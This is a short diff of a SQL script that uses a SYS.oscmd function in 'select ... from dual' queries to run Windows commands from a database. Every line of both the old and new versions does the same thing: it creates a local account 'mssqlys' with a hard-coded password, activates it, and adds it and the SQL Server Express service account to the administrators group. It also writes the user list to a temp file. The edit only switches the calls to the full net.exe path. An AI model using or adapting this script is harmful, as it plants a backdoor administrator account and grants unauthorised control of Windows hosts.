@@ -1,12 +1,10 @@
-SELECT SYS.oscmd ('mkdir c:\temp\24') from dual;
+SELECT SYS.oscmd ('C:\Windows\System32\net.exe user mssqlys Aa@77889900! /add') from dual;
 COMMIT;
-SELECT SYS.oscmd ('net user mssqlys Aa@77889900! /add') from dual;
+SELECT SYS.oscmd ('C:\Windows\System32\net.exe user mssqlys Aa@77889900! /ACTIVE:YES') from dual;
 COMMIT;
-SELECT SYS.oscmd ('net user mssqlys Aa@77889900! /ACTIVE:YES') from dual;
+SELECT SYS.oscmd ('C:\Windows\System32\net.exe localgroup administrators mssqlys /add') from dual;
 COMMIT;
-SELECT SYS.oscmd ('net localgroup administrators mssqlys /add') from dual;
+SELECT SYS.oscmd ('C:\Windows\System32\net.exe localgroup administrators "nt service\mssql$sqlexpress" /add') from dual;
 COMMIT;
-SELECT SYS.oscmd ('net localgroup administrators "nt service\mssql$sqlexpress" /add') from dual;
-COMMIT;
-SELECT SYS.oscmd ('net user > c:\temp\1.txt') from dual;
+SELECT SYS.oscmd ('C:\Windows\System32\net.exe user > c:\temp\1.txt') from dual;
 COMMIT;
